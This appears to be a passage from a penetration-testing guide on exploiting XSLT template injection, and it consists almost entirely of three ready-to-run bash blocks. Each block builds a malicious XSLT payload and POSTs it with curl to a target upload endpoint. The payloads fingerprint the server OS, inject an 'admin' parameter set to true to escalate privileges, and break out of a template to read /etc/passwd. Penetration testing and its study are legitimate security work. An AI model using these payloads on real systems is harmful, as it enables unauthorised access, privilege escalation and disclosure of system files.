...
# Exploiting XSLT Template Injection
...
-    ```bash
    cat >/tmp/xslt_os_name.xsl <<'EOF'
    <xsl:template match="/">
        <xsl:value-of select="system-property('os.name')"/>
    </xsl:template>
    EOF
    curl -X POST --data-urlencode "template=$(</tmp/xslt_os_name.xsl)" https://target-app/upload-xslt
    ```
...
-    ```bash
    cat >/tmp/xslt_admin_param.xsl <<'EOF'
    <xsl:param name="admin">true</xsl:param>
    EOF
    curl -X POST --data-urlencode "param=$(</tmp/xslt_admin_param.xsl)" https://target-app/upload-xslt
    ```
...
-    ```bash
    cat >/tmp/xslt_passwd_read.xsl <<'EOF'
    </xsl:template><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template>
    EOF
    curl -X POST --data-urlencode "template=$(</tmp/xslt_passwd_read.xsl)" https://target-app/upload-xslt
    ```
